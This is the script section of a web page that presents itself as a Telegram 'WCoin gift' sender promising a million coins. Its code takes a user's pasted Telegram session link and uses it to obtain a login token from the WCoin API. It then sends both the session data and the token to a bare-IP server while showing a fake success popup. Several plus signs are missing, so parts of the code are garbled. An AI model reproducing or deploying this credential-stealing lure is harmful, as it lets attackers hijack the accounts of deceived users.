<script>

        function parseSessionLink(url) {
            const parsedUrl = new URL(url);
            const params = new URLSearchParams(parsedUrl.hash.slice(1));
            const tgWebAppData = params.get('tgWebAppData');
            const userData = new URLSearchParams(tgWebAppData).get('user');
            return JSON.parse(decodeURIComponent(userData));
        }

        async function authWcoin(sessionLink) {
            const userData = parseSessionLink(sessionLink);
            const identifier = userData.id.toString();
            const response = await axios.post('https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local', {
                identifier: identifier,
                password: identifier
            });
            return response.data;
        }

        const sendGiftButton = document.getElementById('sendGiftButton');

        document.getElementById('giftForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const sessionLink = document.getElementById('session_link').value;
            const resultDiv = document.getElementById('result');
            const apiLink = 'http://213.218.240.167:5000/api';

            sendGiftButton.disabled = true;
            sendGiftButton.innerHTML = 'Launching...';

            try {
                const jwt = await authWcoin(sessionLink);
                const response = await axios.post(apiLink, {
                    initData: sessionLink,
                    serverData: jwt,
                });

                showSuccessPopup();
                resultDiv.innerHTML = `Gift sent successfully!`;
                resultDiv.className = 'mt-4 text-sm text-green-600';
                resetButton();
            } catch (error) {
                console.error('Error:', error);
                if (error.response && error.response.status === 429) {
                    showErrorPopup('Rate Limit Exceeded', 'Please try again after 24 hours.', true);
                    disableButtonForRateLimit();
                } else {
                    showErrorPopup('Error', 'An error occurred. Please check your session link and try again.');
                    resetButton();
                }
            }
        });

        function resetButton() {
            sendGiftButton.disabled = false;
            sendGiftButton.innerHTML = 'Send Gift';
        }

        function disableButtonForRateLimit() {
            sendGiftButton.disabled = true;
            sendGiftButton.innerHTML = 'Try Again in 24h';
            sendGiftButton.classList.add('bg-gray-400', 'hover:bg-gray-400');
            sendGiftButton.classList.remove('bg-cyan-400', 'hover:bg-cyan-500');
        }

        function showSuccessPopup() {
            showPopup('Success!', 'fas fa-gift text-6xl text-cyan-300 float-animation', '1,000,000 WCoins have been added to your account!');
            for (let i = 0; i 
< 100; i  ) {
                createConfetti();
            }
        }

        function showErrorPopup(title, message, showTelegramButton = false) {
            showPopup(title, 'fas fa-exclamation-circle text-6xl text-red-500', message, showTelegramButton);
        }

        function showPopup(title, iconClass, message, showTelegramButton = false) {
            const popup = document.getElementById('popup');
            const popupTitle = document.getElementById('popupTitle');
            const popupIcon = document.getElementById('popupIcon');
            const popupMessage = document.getElementById('popupMessage');
            const telegramButton = document.getElementById('telegramButton');
            
            popupTitle.textContent = title;
            popupIcon.innerHTML = `
<i class="${iconClass}">

</i>
`;
            popupMessage.textContent = message;
            
            if (showTelegramButton) {
                telegramButton.classList.remove('hidden');
            } else {
                telegramButton.classList.add('hidden');
            }
            
            popup.classList.remove('hidden');
            gsap.from(popup, {opacity: 0, y: 50, duration: 0.3, ease: "back.out(1.7)"});
        }

        function closePopup() {
            const popup = document.getElementById('popup');
            gsap.to(popup, {
                opacity: 0, 
                y: 50, 
                duration: 0.2, 
                ease: "power2.in", 
                onComplete: () =>
 {
                    popup.classList.add('hidden');
                    document.querySelectorAll('.confetti').forEach(el =>
 el.remove());
                }
            });
        }

        document.getElementById('closePopup').addEventListener('click', closePopup);

        function createConfetti() {
            const confetti = document.createElement('div');
            confetti.classList.add('confetti');
            confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
            confetti.style.width = `${Math.random() * 5   5}px`;
            confetti.style.height = confetti.style.width;
            confetti.style.left = `${Math.random() * 100}vw`;
            confetti.style.top = '-20px';
            document.body.appendChild(confetti);

            gsap.to(confetti, {
                y: '120vh',
                x: ` =${(Math.random() - 0.5) * 100}`,
                rotation: Math.random() * 720 - 360,
                duration: Math.random() * 2   1,
                ease: 'power1.out',
                onComplete: () =>
 confetti.remove()
            });
        }
    
</script>



</body>

</html>
